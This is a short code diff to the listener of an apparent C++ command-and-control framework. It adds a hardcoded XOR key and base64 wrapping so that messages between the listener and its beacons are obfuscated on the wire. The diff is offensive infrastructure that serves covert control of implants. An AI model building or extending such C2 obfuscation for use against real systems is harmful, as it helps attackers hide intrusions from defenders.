@@ -284,9 +284,13 @@ C2Message Listener::getTaskResult(std::string& beaconHash)
 // output is the message send by listener to the beacon
 bool Listener::handleMessages(const std::string& input, std::string& output)
 {
+	std::string key="dfsdgferhzdzxczevre5595485sdg";
+	std::string data = base64_decode(input);
+	XOR(data, key);
+
 	// Mutli Session, Multi message 
 	MultiBundleC2Message multiBundleC2Message;
-	multiBundleC2Message.ParseFromArray(input.data(), (int)input.size());
+	multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
 
 	bool isTaskToSend=false;
 	MultiBundleC2Message multiBundleC2MessageRet;
@@ -395,8 +399,12 @@ bool Listener::handleMessages(const std::string& input, std::string& output)
 		}
 	}
 
+	data="";
 	if(isTaskToSend)
-		multiBundleC2MessageRet.SerializeToString(&output);
+		multiBundleC2MessageRet.SerializeToString(&data);
+
+	XOR(data, key);
+	output = base64_encode(data);
 
 	return isTaskToSend;
 }
